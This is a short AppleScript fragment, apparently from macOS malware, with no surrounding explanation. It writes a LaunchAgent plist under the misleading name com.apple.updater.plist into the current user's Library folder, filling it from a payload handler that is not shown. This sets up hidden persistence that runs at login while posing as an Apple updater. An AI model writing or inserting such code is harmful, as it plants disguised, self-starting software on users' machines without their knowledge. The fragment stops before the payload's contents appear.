set plist to "/Users/" & (do shell script "whoami") & "/Library/LaunchAgents/com.apple.updater.plist"
do shell script "echo '" & my make_plist_payload() & "' > " & plist
